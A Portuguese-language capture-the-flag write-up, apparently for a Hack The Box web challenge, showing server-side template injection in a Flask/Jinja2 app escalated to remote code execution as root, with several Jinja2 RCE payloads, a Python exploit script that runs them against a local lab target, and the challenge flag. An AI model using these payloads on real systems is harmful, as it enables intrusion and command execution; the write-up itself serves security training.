---
title: "Templated"
date: 2024-09-05
type: "challenges"
difficulty: "Easy"
pwned: true
points: 50
tags: ["web", "ssti", "jinja2", "python", "rce"]
summary: "Flask app vulnerável a Server-Side Template Injection via Jinja2. RCE direto pelo payload {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}."
---

## Análise Inicial

Site exibe o path da URL diretamente na página. Acessando `/teste`:

```
Error 404 - 'teste' not found
```

## Testando SSTI

Payload básico Jinja2:

```
/{{7*7}}
```

Resposta:

```
Error 404 - '49' not found
```

**Confirmado: SSTI com Jinja2.**

## Escalando para RCE

```
/{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Rodando como root. Lendo a flag:

```
/{{config.__class__.__init__.__globals__['os'].popen('cat%20/flag').read()}}
```

## Script de Exploit

```python
import requests

TARGET = "http://127.0.0.1:1337"

payloads = [
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
    "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[407]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}",
]

for p in payloads:
    r = requests.get(f"{TARGET}/{p}")
    if "HTB{" in r.text:
        import re
        flag = re.search(r'HTB\{[^}]+\}', r.text).group()
        print(f"[+] Flag: {flag}")
        break
```

## Flag

```
HTB{t3mpl4t3s_4r3_p0w3rful_b3_c4r3ful}
```
